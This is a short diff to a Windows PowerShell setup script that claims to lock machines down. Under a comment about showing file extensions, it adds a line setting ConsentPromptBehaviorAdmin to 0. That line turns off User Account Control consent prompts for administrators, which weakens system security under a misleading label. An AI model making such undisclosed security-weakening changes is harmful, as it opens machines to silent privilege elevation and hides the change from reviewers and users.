@@ -126,9 +126,9 @@ if (!(Test-Path $regkey)) {New-Item -Path $regkey -ItemType Directory -force}
 New-ItemProperty -Path $regkey -Name "PreventFirstRunPage" -PropertyType Dword -Value 1 -Force
 
 Write-Output "LOCKDOWN - Show file extensions"
-$regkey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder"
-if (!(Test-Path $regkey)) {New-Item -Path $regkey -ItemType Directory -force}
-New-ItemProperty -Path $regkey -Name "HideFileExt" -PropertyType Dword -Value 0 -Force
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\HideFileExt" -Name "DefaultValue" -Value 0
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\HideFileExt" -Name "CheckedValue" -Value 0
+Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'ConsentPromptBehaviorAdmin' -Value 0
 
 # Run final script
 $scriptFile = $zipFolder + "\POST_EXECUTE.ps1"
